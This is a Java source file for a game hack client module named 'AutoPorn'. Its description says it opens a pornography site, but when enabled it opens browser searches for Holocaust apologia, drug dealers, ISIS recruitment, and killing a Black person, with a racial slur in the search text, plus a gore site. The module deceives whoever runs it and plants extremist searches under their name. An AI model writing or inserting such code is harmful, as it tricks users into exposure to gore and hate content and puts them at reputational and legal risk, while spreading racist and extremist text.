package cat.yoink.zodiac.module.modules.misc;

import cat.yoink.zodiac.module.manager.module.Category;
import cat.yoink.zodiac.module.manager.module.Module;

import java.awt.*;
import java.net.URI;

public class AutoPorn extends Module
{

    public AutoPorn()
    {

        super("AutoPorn", "Opens pornhub if you want to jerk off.", Category.MISC, true);

    }


    public void onEnable()
    {
        try
        {
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=hitler+did+nothing+wrong"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=local+drugdealer+in+my+area"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=i+want+to+kill+a+nigger"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=how+to+join+isis"));
            Desktop.getDesktop().browse(URI.create("https://bestgore.com"));
            Desktop.getDesktop().browse(URI.create("https://ifunny.co"));
            Desktop.getDesktop().browse(URI.create("https://ifunny.co"));
            Desktop.getDesktop().browse(URI.create("https://ifunny.co"));
        }
        catch (Exception ignored)
        {
        }
    }
}
